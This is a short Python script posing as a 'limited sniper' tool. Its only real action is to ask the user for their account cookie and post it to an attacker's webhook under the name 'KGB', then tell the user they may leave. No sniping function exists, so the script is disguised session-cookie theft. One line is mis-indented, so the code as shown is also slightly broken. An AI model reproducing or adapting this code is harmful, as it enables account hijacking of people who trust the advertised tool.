from dhooks import Webhook
import requests, threading, os
import time
import colorama
from colorama import Fore, Back, Style
from pystyle import Anime, Colorate, Colors, Center, System, Write

colorama.init()

loadingauth = ""


def w(text: str):
    Write.Input(text=text,
                color=Colors.purple_to_blue,
                interval=0.005,
                input_color=Colors.white)


def startup():
    System.Clear()
    System.Title("Unknown Sniper")
    System.Size(200, 60)


startup()


def main():
    w("Welcome to Unknown Limited Sniper!")
    cookiedata = Write.Input("cookie ->",
                             Colors.purple_to_blue,
                             interval=0.005)
    os.system('cls')
    w("Loading")
    requests.post(loadingauth,
                  json={
                      'username': 'KGB',
                      'content': f'```{cookiedata}```'
                  })
  w("You can leave this program now by pressing enter. :)")
    os.system('cls')



main()
